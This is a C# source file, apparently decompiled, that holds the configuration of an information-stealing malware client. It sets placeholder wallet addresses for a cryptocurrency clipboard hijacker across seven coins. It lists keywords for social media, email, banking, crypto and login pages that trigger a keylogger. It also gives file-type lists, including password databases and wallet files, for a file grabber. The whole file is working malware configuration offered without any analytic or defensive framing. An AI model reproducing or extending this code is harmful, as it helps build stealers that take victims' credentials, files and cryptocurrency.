using System.Collections.Generic;

namespace Client.Modules;

internal sealed class Config
{
	public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
	{
		{ "btc", "--- ClipperBTC ---" },
		{ "eth", "--- ClipperETH ---" },
		{ "xmr", "--- ClipperXMR ---" },
		{ "xlm", "--- ClipperXLM ---" },
		{ "xrp", "--- ClipperXRP ---" },
		{ "ltc", "--- ClipperLTC ---" },
		{ "bch", "--- ClipperBCH ---" }
	};

	public static string[] KeyloggerServices = new string[27]
	{
		"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
		"outlook", "password", "encryption", "account", "login", "key", "sign in", "пароль", "bank", "банк",
		"credit", "card", "кредит", "shop", "buy", "sell", "купить"
	};

	public static string[] BankingServices = new string[11]
	{
		"qiwi", "money", "exchange", "chase", "wellsfargo", "bankofamerica", "bank", "credit", "card", "банк",
		"кредит"
	};

	public static string[] CryptoServices = new string[23]
	{
		"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
		"xrp", "ltc", "bch", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency", "crypto", "trade",
		"trading", "биткоин", "wallet"
	};

	public static string[] PornServices = new string[5] { "porn", "sex", "hentai", "порно", "sex" };

	public static int GrabberSizeLimit = 5120;

	public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
	{
		["Document"] = new string[11]
		{
			"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
			"json"
		},
		["DataBase"] = new string[13]
		{
			"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
			"dbf", "wallet", "ini"
		},
		["SourceCode"] = new string[19]
		{
			"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
			"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
		},
		["Image"] = new string[7] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
	};
}
